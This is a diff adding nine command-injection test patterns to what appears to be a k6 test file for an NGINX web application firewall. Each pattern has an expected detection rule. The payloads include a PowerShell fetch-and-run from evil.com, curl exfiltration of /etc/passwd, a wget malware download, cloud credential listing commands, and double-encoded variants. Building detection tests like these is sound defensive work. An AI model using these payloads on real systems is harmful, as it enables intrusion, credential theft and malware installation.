@@ -1,7 +1,7 @@
 {
   "metadata": {
     "category": "cmdinj",
-    "total_patterns": 89,
+    "total_patterns": 98,
     "port": 8004,
     "description": "k6 test patterns for cmdinj"
   },
@@ -1073,6 +1073,114 @@
       "expected_detection": true,
       "severity": "critical",
       "expected_rule": "[NGINX Traversal] File inclusion attack detected"
+    },
+    {
+      "id": "CMDI_CLOUD_001",
+      "name": "AWS S3 command injection",
+      "category": "cmdinj",
+      "subcategory": "cloud_cmd",
+      "payload": ";aws s3 ls",
+      "encoded": "%3Baws%20s3%20ls",
+      "port": 80,
+      "expected_detection": true,
+      "severity": "critical",
+      "expected_rule": "[NGINX CMDi] Command injection via semicolon"
+    },
+    {
+      "id": "CMDI_CLOUD_002",
+      "name": "GCloud auth command injection",
+      "category": "cmdinj",
+      "subcategory": "cloud_cmd",
+      "payload": ";gcloud auth list",
+      "encoded": "%3Bgcloud%20auth%20list",
+      "port": 80,
+      "expected_detection": true,
+      "severity": "critical",
+      "expected_rule": "[NGINX CMDi] Command injection via semicolon"
+    },
+    {
+      "id": "CMDI_CLOUD_003",
+      "name": "Azure account command injection",
+      "category": "cmdinj",
+      "subcategory": "cloud_cmd",
+      "payload": ";az account show",
+      "encoded": "%3Baz%20account%20show",
+      "port": 80,
+      "expected_detection": true,
+      "severity": "critical",
+      "expected_rule": "[NGINX CMDi] Command injection via semicolon"
+    },
+    {
+      "id": "CMDI_PS_001",
+      "name": "PowerShell IEX command injection",
+      "category": "cmdinj",
+      "subcategory": "powershell",
+      "payload": ";powershell -c IEX(New-Object Net.WebClient).DownloadString('http://evil.com/a')",
+      "encoded": "%3Bpowershell%20-c%20IEX%28New-Object%20Net.WebClient%29.DownloadString%28%27http%3A%2F%2Fevil.com%2Fa%27%29",
+      "port": 80,
+      "expected_detection": true,
+      "severity": "critical",
+      "expected_rule": "[NGINX CMDi] Advanced command injection attempt"
+    },
+    {
+      "id": "CMDI_PS_002",
+      "name": "PowerShell encoded command injection",
+      "category": "cmdinj",
+      "subcategory": "powershell",
+      "payload": ";powershell -enc JABjAGwAaQBlAG4AdA",
+      "encoded": "%3Bpowershell%20-enc%20JABjAGwAaQBlAG4AdA",
+      "port": 80,
+      "expected_detection": true,
+      "severity": "critical",
+      "expected_rule": "[NGINX CMDi] Advanced command injection attempt"
+    },
+    {
+      "id": "CMDI_CURL_001",
+      "name": "Curl data exfiltration",
+      "category": "cmdinj",
+      "subcategory": "data_exfil",
+      "payload": "|curl http://evil.com/exfil?d=$(cat /etc/passwd)",
+      "encoded": "%7Ccurl%20http%3A%2F%2Fevil.com%2Fexfil%3Fd%3D%24%28cat%20%2Fetc%2Fpasswd%29",
+      "port": 80,
+      "expected_detection": true,
+      "severity": "critical",
+      "expected_rule": "[NGINX CMDi] Command injection via pipe"
+    },
+    {
+      "id": "CMDI_WGET_001",
+      "name": "Wget malware download",
+      "category": "cmdinj",
+      "subcategory": "malware_download",
+      "payload": ";wget http://evil.com/malware -O /tmp/m",
+      "encoded": "%3Bwget%20http%3A%2F%2Fevil.com%2Fmalware%20-O%20%2Ftmp%2Fm",
+      "port": 80,
+      "expected_detection": true,
+      "severity": "critical",
+      "expected_rule": "[NGINX CMDi] Command injection via semicolon"
+    },
+    {
+      "id": "ENC_CMDI_DBL_001",
+      "name": "Double-encoded semicolon cat passwd",
+      "category": "cmdinj",
+      "subcategory": "double_encoded",
+      "payload": ";cat /etc/passwd",
+      "encoded": "%253Bcat%20%252Fetc%252Fpasswd",
+      "port": 80,
+      "expected_detection": true,
+      "severity": "high",
+      "expected_rule": "[NGINX CMDi] Advanced command injection attempt"
+    },
+    {
+      "id": "ENC_CMDI_DBL_002",
+      "name": "Double-encoded pipe whoami",
+      "category": "cmdinj",
+      "subcategory": "double_encoded",
+      "payload": "|whoami",
+      "encoded": "%257Cwhoami",
+      "port": 80,
+      "expected_detection": true,
+      "severity": "high",
+      "expected_rule": "[NGINX CMDi] Advanced command injection attempt"
     }
   ]
 }
